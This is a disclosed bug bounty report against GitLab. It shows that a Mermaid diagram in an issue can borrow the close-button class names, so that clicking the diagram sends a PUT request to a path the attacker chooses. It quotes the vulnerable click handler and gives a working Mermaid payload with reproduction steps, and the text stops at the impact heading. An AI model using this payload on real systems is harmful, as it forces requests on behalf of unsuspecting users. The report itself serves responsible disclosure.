# [M] Send arbitrary PUT requests when user clicks on a link

## Summary
Severity: Medium
Program: GitLab
Weakness: Command Injection - Generic
Reporter: yvvdwf
State: resolved
Disclosed: 2020-07-27T08:44:34.335Z
Source: https://hackerone.com/reports/824689

## Details
Dear teams,

### Summary

Mermaid allows users to set class name of a block. This ability becomes vulnerable in Gitlab issues because of [issue.js#L90](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/issue.js#L90):

```javascript
    return $(document).on(
      'click',
      '.js-issuable-actions a.btn-close, .js-issuable-actions a.btn-reopen',
      e => {
...
       const $button = $(e.currentTarget);
...
        const url = $button.attr('href');
        return axios
          .put(url)
          .then(({ data }) => {
...
```

### Steps to reproduce

 1. Create any issue
 2. Enter the following payload as the description of the issue:

```
```mermaid
graph TD;
 A[Click to send a PUT request];
 class A js-issuable-actions;
 class A btn-close;
 click A "./put-destination" "click to PUT"
```

After saving the issue, if you click on the block `Click to send a PUT request`, a `PUT` request will be sent to `./put-destination`

### Impact
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/824689_
